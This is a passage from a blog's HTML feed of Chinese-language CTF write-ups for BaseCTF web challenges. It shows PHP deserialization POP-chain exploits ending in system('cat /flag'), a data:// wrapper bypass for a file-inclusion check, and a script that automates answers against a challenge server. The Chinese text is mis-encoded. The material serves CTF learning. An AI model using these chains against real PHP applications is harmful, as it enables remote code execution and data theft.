<span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are over!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>pocé“¾</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">web</span>-&gt;</span><span class="function"><span class="title">re</span>-&gt;</span><span class="function"><span class="title">pwn</span>-&gt;</span>misc</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;chu0))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0-&gt;<span class="variable">$nononono</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kw</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dt</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;lalalla&quot;</span>.<span class="variable language_">$this</span>-&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ALL Done!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dusk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$over</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;dusk != <span class="string">&quot;gods&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ä»€ä¹ˆï¼Œä½ ç«Ÿæ•¢ä¸è®¤å¯?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;over-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nothing</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">web</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kw = <span class="keyword">new</span> <span class="title function_ invoke__">re</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kw-&gt;chu0 = <span class="keyword">new</span> <span class="title function_ invoke__">pwn</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kw-&gt;chu0-&gt;over = <span class="keyword">new</span> <span class="title class_">Misc</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:3:&quot;web&quot;:2:&#123;s:2:&quot;kw&quot;;O:2:&quot;re&quot;:1:&#123;s:4:&quot;chu0&quot;;O:3:&quot;pwn&quot;:2:&#123;s:4:&quot;dusk&quot;;N;s:4:&quot;over&quot;;O:4:&quot;Misc&quot;:2:&#123;s:7:&quot;nothing&quot;;N;s:4:&quot;flag&quot;;N;&#125;&#125;&#125;s:2:&quot;dt&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h3><p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;echo 123;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$word</span> = <span class="string">&#x27;Hello, World!&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Shark says:&#x27;</span> . <span class="variable language_">$this</span>-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$sea_ani</span> = <span class="variable language_">$this</span>-&gt;animal;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="variable">$sea_ani</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$nature</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pocé“¾</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">N<span class="function"><span class="title">ature</span>-&gt;</span>S<span class="function"><span class="title">ea</span>-&gt;</span>S<span class="function"><span class="title">hark</span>-&gt;</span>Sink</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$word</span> ;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;word = <span class="string">&quot;sdts&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;word = <span class="keyword">new</span> <span class="title class_">Sink</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;animal = <span class="keyword">new</span> <span class="title class_">Shark</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sea = <span class="keyword">new</span> <span class="title class_">Sea</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$nature</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Nature</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šåœ¨phpä½ç‰ˆæœ¬ä¸­privateç±»å¯¹è±¡ä¸­çš„å‚æ•°ä¸å¯ä»¥ç›´æ¥èµ‹å€¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨ç±»å†…æ·»åŠ é­”æœ¯æ–¹æ³•__construct()æ¥å¯¹ç§æœ‰å¯¹è±¡ä¸­çš„å˜é‡èµ‹å€¼</p><p>è¡¥å……ï¼šç”±äºphpåºåˆ—åŒ–æ—¶privateå’Œprotectedç±»å‚æ•°ä¼šå¼•å…¥ä¸å¯è§å­—ç¬¦%00ï¼Œå…¶ä¸­privateå˜é‡è¡¨ç¤ºä¸º%00ç±»å%00å±æ€§åï¼Œè€Œprotectedå˜é‡è¡¨ç¤ºä¸º%00*%00å±æ€§åï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨urlencodeå¯¹payloadè¿›è¡Œç¼–ç ï¼Œä¸ç„¶å¯èƒ½ä¼šå¯¼è‡´æœåŠ¡å™¨è¯†åˆ«ä¸äº†privateå’Œprotectedå˜é‡ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://www.freebuf.com/articles/web/347246.html">https://www.freebuf.com/articles/web/347246.html</a></p><h3 id="æ•°å­¦å¤§å¸ˆ"><a href="#æ•°å­¦å¤§å¸ˆ" class="headerlink" title="æ•°å­¦å¤§å¸ˆ"></a>æ•°å­¦å¤§å¸ˆ</h3><p>é¢˜ç›®æç¤ºéœ€è¦å¼€å¯session cookie</p><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€å¯ä¼šè¯</span></span><br><span class="line">req = requests.session() </span><br><span class="line">url = <span class="string">&quot;http://challenge.basectf.fun:34378&quot;</span></span><br><span class="line"></span><br><span class="line">answer = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res = req.post(url=url,data=&#123;<span class="string">&quot;answer&quot;</span>:answer&#125;)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Base&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># æ­£åˆ™åŒ¹é…</span></span><br><span class="line">    search = <span class="string">&quot;(\d*)(.)(\d*)(\?)&quot;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(search,res.text)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>.group(<span class="number">2</span>) == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">        answer = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)) + <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">match</span>.group(<span class="number">2</span>) == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">        answer = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)) - <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">match</span>.group(<span class="number">2</span>) == <span class="string">&quot;Ã—&quot;</span>:</span><br><span class="line">        answer =<span class="built_in">int</span>( <span class="keyword">match</span>.group(<span class="number">1</span>)) * <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">match</span>.group(<span class="number">2</span>) == <span class="string">&quot;Ã·&quot;</span>:</span><br><span class="line">        answer = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)) //<span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¨èä¸€ä¸ªæ­£åˆ™åŒ¹é…ç½‘ç«™ï¼Œå¯ä»¥çœ‹åˆ°åŒ¹é…æ•ˆæœï¼š<a href="https://regex101.com/">https://regex101.com/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> BaseCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF wp(week1)</title>
      <link href="/2024/09/04/BaseCTF_week1/"/>
      <url>/2024/09/04/BaseCTF_week1/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="A-Dark-Room"><a href="#A-Dark-Room" class="headerlink" title="A Dark Room"></a>A Dark Room</h3><p>å‰ç«¯æºç æœ‰flag</p><h3 id="HTTPæ˜¯ä»€ä¹ˆå‘€"><a href="#HTTPæ˜¯ä»€ä¹ˆå‘€" class="headerlink" title="HTTPæ˜¯ä»€ä¹ˆå‘€"></a>HTTPæ˜¯ä»€ä¹ˆå‘€</h3><p><img src="/2024/09/04/BaseCTF_week1/1.png" alt="å›¾ç‰‡"></p><p>å¾—åˆ°</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">QmFzZUNURns4Yzk4MWY0Ny01ZWIwLTQ0ZmMtODJhMy0zZDc5ZDQ4YTlkMWF9Cg</span><span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure><p>base64è§£ç å³å¯å¾—flag</p><h3 id="Aura-é…±çš„ç¤¼ç‰©"><a href="#Aura-é…±çš„ç¤¼ç‰©" class="headerlink" title="Aura é…±çš„ç¤¼ç‰©"></a>Aura é…±çš„ç¤¼ç‰©</h3><p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Aura é…±ï¼Œæ¬¢è¿å›å®¶~</span></span><br><span class="line"><span class="comment">// è¿™é‡Œæœ‰ä¸€ä»½ç¤¼ç‰©ï¼Œè¯·ä½ ç­¾æ”¶ä¸€ä¸‹å“Ÿ~</span></span><br><span class="line"><span class="variable">$pen</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pen&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pen</span>) !== <span class="string">&#x27;Aura&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;è¿™æ˜¯ Aura çš„ç¤¼ç‰©ï¼Œä½ ä¸æ˜¯ Auraï¼&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¤¼ç‰©æ”¶åˆ°å•¦ï¼Œæ¥ä¸‹æ¥è¦å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~</span></span><br><span class="line"><span class="variable">$challenge</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;challenge&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$challenge</span>, <span class="string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;è¿™ä¸æ˜¯ Aura çš„åšå®¢ï¼&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$blog_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$challenge</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$blog_content</span>, <span class="string">&#x27;å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦&#x27;</span>) === <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;è¯·å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å˜¿å˜¿ï¼Œæ¥ä¸‹æ¥è¦æ‹†å¼€ç¤¼ç‰©å•¦ï¼Œæ‚„æ‚„å‘Šè¯‰ä½ ï¼Œç¤¼ç‰©åœ¨ flag.php é‡Œé¢å“¦~</span></span><br><span class="line"><span class="variable">$gift</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;gift&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$gift</span>); è¿™æ˜¯ Aura çš„ç¤¼ç‰©ï¼Œä½ ä¸æ˜¯ Auraï¼</span><br></pre></td></tr></table></figure><p>å¯¹æºç åˆ†æï¼Œæ˜¯åŒ…å«ä¸‰ä¸ªåˆ¤æ–­çš„æ–‡ä»¶åŒ…å«æ¼æ´</p><p>å¯¹äºç¬¬ä¸€ä¸ªåˆ¤æ–­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pen</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pen&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pen</span>) !== <span class="string">&#x27;Aura&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;è¿™æ˜¯ Aura çš„ç¤¼ç‰©ï¼Œä½ ä¸æ˜¯ Auraï¼&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨dataä¼ªåè®®ç»•è¿‡</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">url</span>?pen=<span class="class"><span class="keyword">data</span>://text/plain,<span class="type">Aura</span></span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªåˆ¤æ–­å’Œç¬¬ä¸‰ä¸ªåˆ¤æ–­æ˜¯åŒä¸€ä¸ªå‚æ•°ï¼Œåˆå¹¶åœ¨ä¸€èµ·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$challenge</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;challenge&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$challenge</span>, <span class="string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;è¿™ä¸æ˜¯ Aura çš„åšå®¢ï¼&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$blog_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$challenge</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$blog_content</span>, <span class="string">&#x27;å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦&#x27;</span>) === <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;è¯·å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£æ</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œå¯ä»¥çœ‹åˆ°challengeæ—¢è¦æ»¡è¶³http:<span class="regexp">//</span>jasmineaura.github.ioå¼€å¤´ï¼Œ</span><br><span class="line">åˆè¦åŒ…å«ä¸­æ–‡<span class="string">&quot;å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦&quot;</span>ï¼Œ</span><br><span class="line">ä»…ä»…é€šè¿‡dataä¼ªåè®®å·²ç»æ— æ³•æ»¡è¶³æ¡ä»¶ï¼Œ</span><br><span class="line">æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œä½¿ç”¨<span class="variable">@æ‹¼</span>æ¥ï¼Œ</span><br><span 